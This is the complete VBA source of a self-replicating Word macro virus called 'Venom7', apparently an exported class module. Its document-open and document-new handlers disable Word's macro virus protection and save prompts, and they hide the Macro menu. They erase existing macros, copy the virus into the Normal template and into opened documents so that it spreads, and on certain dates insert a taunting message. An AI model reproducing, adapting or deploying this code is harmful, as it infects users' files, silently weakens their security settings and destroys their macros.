   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Venom7"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True


   Private Sub Document_New()
   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
   Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
   Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
   NTCL = NTI1.CodeModule.CountOfLines
   ADCL = ADI1.CodeModule.CountOfLines
   BGN = 2

   If ADI1.Name <> "Venom7" Then
       If ADCL > 0 Then
           Dim f As Long
           For f = 1 To ADCL
               On Error Resume Next
               ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
           Next f
           ADI1.Name = "Venom7"
           DoAD = True
       Else
           ADI1.Name = "Venom7"
           DoAD = True
       End If
   End If

   If NTI1.Name <> "Venom7" Then
       If NTCL > 0 Then
           Dim i As Long
           For i = 1 To NTCL
               On Error Resume Next
               NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
           Next i
           NTI1.Name = "Venom7"
           DoNT = True
       Else
           NTI1.Name = "Venom7"
           DoNT = True
       End If
   End If
   If DoNT <> True And DoAD <> True Then GoTo CYA

   If DoAD = True Then
       For hunger = NTCL To 1 Step -1
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
       Next hunger
       docname = Left$(ActiveDocument.Name, 8)
       If docname <> "Document" Then
       ActiveDocument.Save
       End If
   End If

   If DoNT = True Then
       For hunger = ADCL To 1 Step -1
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
       Next hunger
   End If



   CYA:
   If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."

   End Sub

   Private Sub Document_Open()

   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
   Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
   Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
   NTCL = NTI1.CodeModule.CountOfLines
   ADCL = ADI1.CodeModule.CountOfLines
   BGN = 2

   If ADI1.Name <> "Venom7" Then
       If ADCL > 0 Then
           Dim f As Long
           For f = 1 To ADCL
               On Error Resume Next
               ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
           Next f
           ADI1.Name = "Venom7"
           DoAD = True
       Else
           ADI1.Name = "Venom7"
           DoAD = True
       End If
   End If

   If NTI1.Name <> "Venom7" Then
       If NTCL > 0 Then
           Dim i As Long
           For i = 1 To NTCL
               On Error Resume Next
               NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
           Next i
           NTI1.Name = "Venom7"
           DoNT = True
       Else
           NTI1.Name = "Venom7"
           DoNT = True
       End If
   End If
   If DoNT <> True And DoAD <> True Then GoTo CYA

   If DoAD = True Then
       For hunger = NTCL To 1 Step -1
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
       Next hunger
       ActiveDocument.Save
   End If

   If DoNT = True Then
       For hunger = ADCL To 1 Step -1
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
       Next hunger
   End If



   CYA:
   If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
   End Sub
